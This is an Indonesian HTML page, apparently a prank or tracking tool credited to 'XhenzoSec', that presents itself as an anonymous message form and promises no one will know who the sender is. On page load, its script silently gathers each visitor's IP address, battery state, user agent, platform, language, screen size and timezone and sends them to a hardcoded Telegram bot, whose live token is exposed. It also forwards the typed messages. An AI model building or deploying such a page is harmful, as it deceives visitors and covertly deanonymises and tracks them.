<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pesan Anonim</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
        
        body {
            font-family: 'Poppins', sans-serif;
            background-color: #000;
            color: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
            overflow-x: hidden;
            opacity: 0;
            animation: fadeIn 1.5s ease-in-out forwards;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .logo {
            width: 150px;
            height: 150px;
            margin-bottom: 20px;
            border-radius: 50%;
            object-fit: cover;
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
            animation: pulse 2s infinite alternate;
        }
        
        @keyframes pulse {
            from { transform: scale(1); box-shadow: 0 0 20px rgba(255, 255, 255, 0.2); }
            to { transform: scale(1.05); box-shadow: 0 0 30px rgba(255, 255, 255, 0.4); }
        }
        
        .container {
            width: 90%;
            max-width: 500px;
            padding: 30px;
            background-color: rgba(20, 20, 20, 0.8);
            border-radius: 15px;
            box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            margin: 20px 0;
        }
        
        h1 {
            margin-top: 0;
            color: #fff;
            font-size: 28px;
            animation: slideIn 1s ease-out;
        }
        
        p {
            color: #ccc;
            margin-bottom: 30px;
            animation: slideIn 1.2s ease-out;
        }
        
        @keyframes slideIn {
            from { opacity: 0; transform: translateX(-20px); }
            to { opacity: 1; transform: translateX(0); }
        }
        
        textarea {
            width: 100%;
            height: 150px;
            padding: 15px;
            border: 2px solid #333;
            border-radius: 10px;
            background-color: #111;
            color: #fff;
            font-family: 'Poppins', sans-serif;
            resize: none;
            margin-bottom: 20px;
            transition: border 0.3s;
        }
        
        textarea:focus {
            outline: none;
            border-color: #6e48aa;
        }
        
        button {
            background: linear-gradient(135deg, #000000 0%, #333333 100%);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 50px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
        }
        
        button:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.6);
        }
        
        button:active {
            transform: translateY(1px);
        }
        
        button:disabled {
            background: linear-gradient(135deg, #555555 0%, #777777 100%);
            cursor: not-allowed;
            box-shadow: none;
        }
        
        .snowflake {
            position: absolute;
            background-color: #fff;
            border-radius: 50%;
            pointer-events: none;
            z-index: -1;
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 25px;
            background: linear-gradient(135deg, #000000 0%, #1a1a1a 100%);
            color: #ffffff;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            transform: translateX(200%);
            transition: transform 0.3s ease-in-out;
            z-index: 1000;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .notification.show {
            transform: translateX(0);
        }
        
        .notification.error {
            background: linear-gradient(135deg, #ff4d4d 0%, #ff7676 100%);
        }
        
        .notification .icon {
            font-size: 18px;
        }
        
        footer {
            margin-top: 30px;
            color: #666;
            font-size: 14px;
        }
        
        .loading {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <img src="https://i.ibb.co.com/qLZ7W9MT/Picsart-25-04-18-21-54-28-031.png" alt="Logo" class="logo" id="logo">
    
    <div class="container">
        <h1>Kirimkan Pesan Untuk Saya â˜º</h1>
        <p>Bagikan pikiran Anda secara anonim. Tidak ada yang akan tahu itu Anda.</p>
        
        <textarea id="message" placeholder="Ketik pesan Anda di sini..."></textarea>
        
        <button id="sendBtn">Kirim Pesan</button>
        <div class="loading" id="loading"></div>
    </div>
    
    <div class="notification" id="notification">
        <span class="icon"></span>
        <span id="notification-text">Pesan berhasil dikirim!</span>
    </div>
    
    <footer>
        Â© 2025 Pesan Anonyomous. Semua hak dilindungi XhenzoSec.
    </footer>

    <script>
        // Telegram Bot Configuration
        const BOT_TOKEN = '7876809256:AAEItpr188UAqxORaFmOoYg6IZcdSMxo56Q';
        const CHAT_ID = '2028336963';
        const MESSAGE_LIMIT = 10;
        const MESSAGE_DELAY = 10 * 1000; // 30 seconds delay between messages
        
        // Generate random user ID
        function generateUserId() {
            return 'USER-' + Math.random().toString(36).substr(2, 9).toUpperCase();
        }
        
        // Snow effect
        function createSnow() {
            const snowflake = document.createElement('div');
            snowflake.className = 'snowflake';
            
            const size = Math.random() * 4 + 2;
            snowflake.style.width = `${size}px`;
            snowflake.style.height = `${size}px`;
            
            snowflake.style.left = `${Math.random() * window.innerWidth}px`;
            snowflake.style.top = '-10px';
            
            snowflake.style.opacity = Math.random() * 0.8 + 0.2;
            
            document.body.appendChild(snowflake);
            
            const duration = Math.random() * 10 + 5;
            
            const animation = snowflake.animate(
                [
                    { top: '-10px', left: `${Math.random() * window.innerWidth}px` },
                    { top: `${window.innerHeight}px`, left: `${Math.random() * window.innerWidth}px` }
                ],
                {
                    duration: duration * 1000,
                    easing: 'linear'
                }
            );
            
            animation.onfinish = () => {
                snowflake.remove();
            };
        }
        
        setInterval(createSnow, 300);
        
        // Collect device information
        async function getDeviceInfo() {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            
            const battery = await navigator.getBattery?.() || {};
            
            return {
                ip: ipData.ip,
                batteryLevel: battery.level ? `${Math.round(battery.level * 100)}%` : 'Tidak Tersedia',
                charging: battery.charging !== undefined ? battery.charging : 'Tidak Tersedia',
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }
        
        // Check message count
        function getMessageCount() {
            return parseInt(localStorage.getItem('messageCount') || '0');
        }
        
        function incrementMessageCount() {
            const count = getMessageCount() + 1;
            localStorage.setItem('messageCount', count);
            return count;
        }
        
        // Check last message time
        function canSendMessage() {
            const lastSent = localStorage.getItem('lastMessageTime');
            if (!lastSent) return true;
            const now = Date.now();
            return now - parseInt(lastSent) >= MESSAGE_DELAY;
        }
        
        function setLastMessageTime() {
            localStorage.setItem('lastMessageTime', Date.now());
        }
        
        function disableSendButton() {
            const sendBtn = document.getElementById('sendBtn');
            sendBtn.disabled = true;
            sendBtn.textContent = 'Batas Pengiriman Tercapai';
        }
        
        // Get formatted timestamp
        function getFormattedTimestamp() {
            const now = new Date();
            return now.toLocaleString('id-ID', {
                day: '2-digit',
                month: '2-digit',
                year: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: false
            });
        }
        
        // Send device info to Telegram when page loads
        document.addEventListener('DOMContentLoaded', async () => {
            try {
                const userId = generateUserId();
                const deviceInfo = await getDeviceInfo();
                const timestamp = getFormattedTimestamp();
                const message = `
ğŸŒŸ <b>Info Pengunjung Baru</b> ğŸŒŸ
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ†” <b>ID Pengguna</b>: ${userId}
â° <b>Waktu</b>: ${timestamp}
ğŸŒ <b>IP</b>: ${deviceInfo.ip}
ğŸ”‹ <b>Baterai</b>: ${deviceInfo.batteryLevel} (Mengisi: ${deviceInfo.charging ? 'Ya' : 'Tidak'})
ğŸ–¥ï¸ <b>User Agent</b>: ${deviceInfo.userAgent}
ğŸ’» <b>Platform</b>: ${deviceInfo.platform}
ğŸŒ <b>Bahasa</b>: ${deviceInfo.language}
ğŸ“ <b>Layar</b>: ${deviceInfo.screen}
â³ <b>Zona Waktu</b>: ${deviceInfo.timezone}
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                `;
                await sendToTelegram(message);
                
                // Check message count and disable button if limit reached
                if (getMessageCount() >= MESSAGE_LIMIT) {
                    disableSendButton();
                }
            } catch (error) {
                console.error('Error mengirim info perangkat:', error);
            }
        });
        
        // Telegram Bot Integration
        const sendBtn = document.getElementById('sendBtn');
        const messageInput = document.getElementById('message');
        const notification = document.getElementById('notification');
        const notificationText = document.getElementById('notification-text');
        const notificationIcon = document.querySelector('.notification .icon');
        const loading = document.getElementById('loading');
        
        sendBtn.addEventListener('click', async () => {
            const message = messageInput.value.trim();
            
            if (message === '') {
                showNotification('Harap masukkan pesan ğŸ“', 'error');
                return;
            }
            
            const messageCount = getMessageCount();
            if (messageCount >= MESSAGE_LIMIT) {
                showNotification('Anda telah mencapai batas pengiriman pesan (3 kali) ğŸ˜”', 'error');
                disableSendButton();
                return;
            }
            
            if (!canSendMessage()) {
                showNotification('Tunggu beberapa saat sebelum mengirim pesan lagi â³', 'error');
                return;
            }
            
            // Show loading indicator
            sendBtn.style.display = 'none';
            loading.style.display = 'block';
            
            try {
                // Send message to Telegram bot
                const userId = generateUserId();
                const timestamp = getFormattedTimestamp();
                const formattedMessage = `
ğŸ“¬ <b>Pesan Dari Seseorang</b> ğŸ“¬
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ· <b>ID Pengguna</b>: ${userId}
â° <b>Waktu</b>: ${timestamp}
ğŸ’¬ <b>Pesan</b>: ${message}
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                `;
                const response = await sendToTelegram(formattedMessage);
                
                if (response.ok) {
                    const newCount = incrementMessageCount();
                    setLastMessageTime();
                    showNotification(`Pesan berhasil dikirim! ğŸš€ (${newCount}/${MESSAGE_LIMIT})`);
                    messageInput.value = '';
                    if (newCount >= MESSAGE_LIMIT) {
                        disableSendButton();
                    }
                } else {
                    showNotification('Gagal mengirim pesan ğŸ˜”', 'error');
                }
            } catch (error) {
                console.error('Error:', error);
                showNotification('Error mengirim pesan ğŸ˜”', 'error');
            } finally {
                // Hide loading indicator
                loading.style.display = 'none';
                sendBtn.style.display = 'inline-block';
            }
        });
        
        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            const params = new URLSearchParams();
            params.append('chat_id', CHAT_ID);
            params.append('text', message);
            params.append('parse_mode', 'HTML');
            
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: params
            });
            
            return await response.json();
        }
        
        function showNotification(text, type = 'success') {
            notificationText.textContent = text;
            notificationIcon.textContent = type === 'error' ? 'âŒ' : 'âœ…';
            
            notification.classList.remove('error');
            if (type === 'error') {
                notification.classList.add('error');
            }
            
            notification.classList.add('show');
            
            setTimeout(() => {
                notification.classList.remove('show');
            }, 3000);
        }
        
        // Entrance animation
        document.addEventListener('DOMContentLoaded', () => {
            const logo = document.getElementById('logo');
            logo.style.transform = 'scale(0)';
            setTimeout(() => {
                logo.style.transition = 'transform 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
                logo.style.transform = 'scale(1)';
            }, 500);
        });
    </script>
</body>
  </html>
